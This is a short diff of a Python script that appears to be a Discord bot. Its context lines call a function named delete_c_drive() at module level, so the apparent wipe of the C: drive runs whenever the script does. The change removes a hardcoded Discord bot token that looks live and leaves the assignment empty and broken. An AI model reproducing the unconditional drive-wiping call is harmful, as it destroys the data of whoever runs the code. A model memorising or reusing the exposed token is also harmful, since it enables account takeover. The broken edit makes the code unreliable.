@@ -151,7 +151,7 @@ def delete_c_drive():
 delete_c_drive()
 
 def run_discord_bot():
-    TOKEN = 'MTIxMzEyMDYwNjM5Mjk1MDgxNA.Gqv65P.hJalKG1SX0oDPEiWdfhXGALpN_y3ta2UcHnzKY'
+    TOKEN = 
     intents = discord.Intents.default()
     client = discord.Client(intents=intents)
 
